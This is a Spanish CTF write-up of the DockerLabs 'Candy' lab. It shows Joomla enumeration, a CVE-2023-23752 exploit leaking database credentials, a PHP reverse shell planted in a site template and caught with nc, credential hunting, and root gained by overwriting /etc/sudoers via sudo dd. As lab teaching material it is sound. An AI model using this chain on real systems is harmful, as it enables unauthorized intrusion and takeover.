---
title: DockerLabs - Candy
summary: "Write-up del laboratorio Candy de DockerLabs"
author: elcybercurioso
date: 2025-10-28 12:00
categories: [Post, DockerLabs]
tags: [fácil, joomla, credentials leaking, information disclosure, rce, sudo]
media_subpath: "/assets/img/posts/dockerlabs_candy"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Candy]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 17:54 GMT
Initiating ARP Ping Scan at 17:54
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 17:54, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:54
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 17:54, 10.30s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up (0.000044s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.62 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65557 (2.625MB)
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Candy]
└─$ nmap -sCV -p80 172.17.0.2                                     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 17:54 GMT
Nmap scan report for consolelog.lab (172.17.0.2)
Host is up (0.000052s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-robots.txt: 17 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /un_caramelo /libraries/ /logs/ /modules/
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.75 seconds
```

## análisis

Comenzamos revisando si existen recursos que podamos revisar en el puerto 80 del servidor:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Candy]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .txt,.html,.php 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 309] [--> http://172.17.0.2/images/]
/index.php            (Status: 200) [Size: 7515]
/media                (Status: 301) [Size: 308] [--> http://172.17.0.2/media/]
/templates            (Status: 301) [Size: 312] [--> http://172.17.0.2/templates/]
/modules              (Status: 301) [Size: 310] [--> http://172.17.0.2/modules/]
/plugins              (Status: 301) [Size: 310] [--> http://172.17.0.2/plugins/]
/includes             (Status: 301) [Size: 311] [--> http://172.17.0.2/includes/]
/language             (Status: 301) [Size: 311] [--> http://172.17.0.2/language/]
/README.txt           (Status: 200) [Size: 4942]
/components           (Status: 301) [Size: 313] [--> http://172.17.0.2/components/]
/api                  (Status: 301) [Size: 306] [--> http://172.17.0.2/api/]
/cache                (Status: 301) [Size: 308] [--> http://172.17.0.2/cache/]
/libraries            (Status: 403) [Size: 275]
/robots.txt           (Status: 200) [Size: 812]
/tmp                  (Status: 301) [Size: 306] [--> http://172.17.0.2/tmp/]
/LICENSE.txt          (Status: 200) [Size: 18092]
/layouts              (Status: 301) [Size: 310] [--> http://172.17.0.2/layouts/]
/administrator        (Status: 301) [Size: 316] [--> http://172.17.0.2/administrator/]
/configuration.php    (Status: 200) [Size: 0]
/htaccess.txt         (Status: 200) [Size: 6456]
/cli                  (Status: 301) [Size: 306] [--> http://172.17.0.2/cli/]
/server-status        (Status: 403) [Size: 275]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

Llegamos a la conclusión de que hay un `Joomla` desplegado, el cual tiene varios formularios de inicio de sesión, pero para ninguno de ellos tenemos credenciales para acceder:

![Desktop View](/20251027185842.webp){: width="972" height="589" .shadow}

En los analisis de `nmap` (que recupera el contenido del fichero `robots.txt`), vemos que hay un recurso llamado `un_caramelo`:

![Desktop View](/20251027185719.webp){: width="972" height="589" .shadow}

Si miramos el código fuente, encontramos unas credenciales:

![Desktop View](/20251027185647.webp){: width="972" height="589" .shadow}

Tratamos de acceder, pero nos daremos cuenta de que no son correctos tal y como los encontramos. Al tratarse de una cadena codificada en base64, debemos decodificarla:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Candy]
└─$ echo "c2**************" | base64 -d; echo
s***********
```

Teniendo la contraseña, ahora si podemos acceder como el usuario `admin` en los dos formularios:

![Desktop View](/20251027193056.webp){: width="972" height="589" .shadow}

El que nos interesa es el que permite gestionar el sitio web:

![Desktop View](/20251027193138.webp){: width="972" height="589" .shadow}

## explotación

Encontramos un recurso en [GitHub](https://github.com/0xNahim/CVE-2023-23752), el cual permite obtener información de las credenciales de las bbdd de ciertas versiones de `Joomla`:

![Desktop View](/20251027194745.webp){: width="972" height="589" .shadow}

En el panel de ayuda nos indican que lo único que debemos indicar es la URL:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Candy/CVE-2023-23752]
└─$ python3 exploit.py              
usage: exploit.py [-h] [-u URL] [-f]

options:
  -h, --help     show this help message and exit
  -u, --url URL  Target url, http://localhost:8080
  -f, --file     Change mode: Multiple targets
```

Haciendo esto, vemos que recuperamos datos sensibles de la base de datos del laboratorio:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Candy/CVE-2023-23752]
└─$ python3 exploit.py -u http://172.17.0.2          
[615] admin (admin) - realmail@dockerlabs.com - Super Users
Site info
Sitename:TLuisillo_o
Editor: tinymce
Captcha: 0
Access: 1
Debug status: False

Database info
DB type: mysqli
DB host: localhost
DB user: joomla_user
DB password: lu************
DB name: joomla_db
DB prefix: umo54_
DB encryption: 0
```

Sin embargo, esto no lo podemos usar todavía, ya que el puerto 3306 no esta abierto en la máquina para que podamos acceder remotamente.

Por ello, nos enfocamos en la obtención de un RCE (Remote Code Execution) a traves de las plantillas que tiene disponibles la web:

![Desktop View](/20251027195044.webp){: width="972" height="589" .shadow}

Debido a que tenemos permisos para modificar las plantillas, podemos entablarnos una reverse shell indicando un script que se encargue de ello (ej: [pentestmonkey php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)):

![Desktop View](/20251027195154.webp){: width="972" height="589" .shadow}

Nos ponemos en escucha por el puerto 4444, y accedemos a una URL que no existe:

![Desktop View](/20251027195538.webp){: width="972" height="589" .shadow}

De esta manera, obtendremos la revershe shell en la maquina victima:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Candy/CVE-2023-23752]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38140
Linux f558d5db82a1 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64 x86_64 x86_64 GNU/Linux
 18:55:02 up 16:03,  0 user,  load average: 2.33, 1.89, 1.91
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Tratamos la tty para poder operar en una consola completamente interactiva:

```bash
$ script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@f558d5db82a1:/$ ^Z
zsh: suspended  nc -nlvp 4444
                                                                                                                                                                                                                   
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Candy/CVE-2023-23752]
└─$ stty raw -echo;fg             
[1]  + continued  nc -nlvp 4444
                               reset xtermwww-data@f558d5db82a1:/$ export TERM=xterm
www-data@f558d5db82a1:/$ export SHELL=bash
```

Revisamos los usuarios disponibles en la maquina a los que podamos apuntar para movernos lateralmente, pero el único usuario que cumple con estas condiciones es `luisillo`:

```bash
www-data@f558d5db82a1:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
_galera:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:102:MariaDB Server,,,:/nonexistent:/bin/false
messagebus:x:102:103::/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
luisillo:x:1001:1001:,,,:/home/luisillo:/bin/bash
```

Con las credenciales obtenidas anteriormente, nos conectamos a la base de datos:

```bash
www-data@f558d5db82a1:/home$ mysql -ujoomla_user -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 237
Server version: 10.11.8-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla_db          |
+--------------------+
2 rows in set (0.002 sec)

MariaDB [(none)]> use joomla_db
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [joomla_db]> show tables;
+-------------------------------+
| Tables_in_joomla_db           |
+-------------------------------+
...
| umo54_users                   |
...
+-------------------------------+
70 rows in set (0.001 sec)
```

Sin embargo, no encontramos mas información interesante, ya que el único registro de usuario es el de `admin`, del cual ya habíamos obtenido su contraseña:

```bash
MariaDB [joomla_db]> select * from umo54_users;
+-----+-------+----------+-------------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+--------+---------------+------------+--------+------+--------------+--------------+
| id  | name  | username | email                   | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+-------+----------+-------------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+--------+---------------+------------+--------+------+--------------+--------------+
| 615 | admin | admin    | realmail@dockerlabs.com | $2y$10$f/d0sy442VzLXyaUhSmmOu.FBRYed2afncJFmYkuJwRwsJQoaGYbW |     0 |         1 | 2024-08-26 05:33:28 | 2025-10-27 18:31:17 | 0          |        | NULL          |          0 |        |      |            0 |              |
+-----+-------+----------+-------------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+--------+---------------+------------+--------+------+--------------+--------------+
1 row in set (0.001 sec)
```

Por ello, seguimos investigando en la maquina, buscando ficheros que puedan pertenecerle al usuario `luisillo`:

```bash
www-data@f558d5db82a1:/home$ find / -user luisillo 2>/dev/null
/home/luisillo
/var/backups
/var/backups/hidden
/var/backups/hidden/otro_caramelo.txt
```

Encontramos un fichero que parece contener otras credenciales, las cuales posiblemente pertenezcan al usuario `luisillo`:

```bash
www-data@f558d5db82a1:/home$ cat /var/backups/hidden/otro_caramelo.txt 


                          _____             _             _           _                                           
                         |  __ \           | |           | |         | |                                          
  ______ ______ ______   | |  | | ___   ___| | _____ _ __| |     __ _| |__  ___     ______ ______ ______ ______   
 |______|______|______|  | |  | |/ _ \ / __| |/ / _ \ '__| |    / _` | '_ \/ __|   |______|______|______|______|  
                         | |__| | (_) | (__|   <  __/ |  | |___| (_| | |_) \__ \                                  
                         |_____/ \___/ \___|_|\_\___|_|  |______\__,_|_.__/|___/                                  



Aqui esta su caramelo Joven :)

<?php
// Información sensible
$db_host = 'localhost';
$db_user = 'luisillo';
$db_pass = 'lui******************';
$db_name = 'joomla_db';

// Código de conexión a la base de datos
function connectToDatabase() {
    global $db_host, $db_user, $db_pass, $db_name;
    $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
    if ($conn->connect_error) {
        die("Conexión fallida: " . $conn->connect_error);
    }
    return $conn;
}

// Información adicional
echo "Bienvenido a Joomla en línea!";
?>
```

Tratamos de conectarnos como `luisillo` con las credenciales recién obtenidas, y vemos que son correctas:

```bash
www-data@f558d5db82a1:/home$ su luisillo
Password: 
luisillo@f558d5db82a1:/home$ whoami
luisillo
```

## escalada de privilegios

Al ir a revisar los permisos SUDO, vemos que podemos ejecutar la utilidad `/bin/dd` como cualquier usuario:

```bash
luisillo@f558d5db82a1:/home$ sudo -l
Matching Defaults entries for luisillo on f558d5db82a1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User luisillo may run the following commands on f558d5db82a1:
    (ALL) NOPASSWD: /bin/dd
```

Encontramos en [GTFOBins](https://gtfobins.github.io/gtfobins/dd/#sudo) que podemos aprovecharnos de esta herramienta para escribir en cualquier fichero:

![Desktop View](/20251027201132.webp){: width="972" height="589" .shadow}

Por ello, para poder conectarnos como `root`, agregamos al usuario `luisillo` al fichero `/etc/sudoers`, ya que de esta manera podremos ejecutar cualquier comando con privilegios de administrador:

```bash
luisillo@f558d5db82a1:/home$ echo "luisillo ALL=(ALL:ALL) ALL" | sudo dd of=/etc/sudoers
0+1 records in
0+1 records out
27 bytes copied, 0.0001833 s, 147 kB/s
luisillo@f558d5db82a1:/home$ sudo -l
[sudo] password for luisillo: 
User luisillo may run the following commands on f558d5db82a1:
    (ALL : ALL) ALL
luisillo@f558d5db82a1:/home$ sudo su
root@f558d5db82a1:/home# whoami
root
```